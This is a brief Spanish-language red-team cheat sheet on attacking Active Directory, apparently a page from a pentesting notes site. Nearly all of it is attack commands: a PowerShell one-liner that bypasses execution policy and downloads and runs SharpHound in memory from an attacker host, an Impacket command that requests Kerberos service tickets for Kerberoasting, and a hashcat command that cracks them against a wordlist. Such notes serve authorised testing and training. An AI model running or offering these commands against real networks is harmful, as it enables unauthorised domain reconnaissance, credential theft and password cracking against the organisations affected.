---
title: Active Directory / Red Teams
description: Tácticas de explotación interna de Active Directory, pivoting y BloodHound.
sidebar:
  order: 1
---

# 🌐 Active Directory & Red Teaming

Metodologías de asalto interno, compromisos de dominios corporativos y persistencia avanzada.

---

## 🐶 Recolección con BloodHound

### Ejecución de SharpHound
```powershell
# Ejecución en memoria sin tocar disco
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.X/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -Domain target.local"
```

---

## 🎟️ Kerberoasting

### Extracción de TGS con Impacket
```bash
impacket-GetUserSPNs target.local/user:password -dc-ip 10.10.10.X -request
```

### Crackeo con Hashcat
```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```
